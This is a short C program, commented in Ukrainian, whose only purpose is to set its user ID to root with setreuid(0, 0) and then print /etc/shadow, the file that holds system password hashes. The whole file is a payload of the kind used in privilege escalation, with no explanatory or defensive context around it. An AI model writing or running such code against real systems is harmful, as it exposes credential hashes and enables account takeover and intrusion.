#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>

int main(void) {
    // Встановлення реального та ефективного UID на 0 (root)
    if (setreuid(0, 0) == -1) {
        perror("Помилка setreuid");
        return EXIT_FAILURE;
    }

    // Виконання команди cat /etc/shadow
    execl("/bin/cat", "cat", "/etc/shadow", (char *)NULL);
    perror("Помилка execl");
    return EXIT_FAILURE;
}
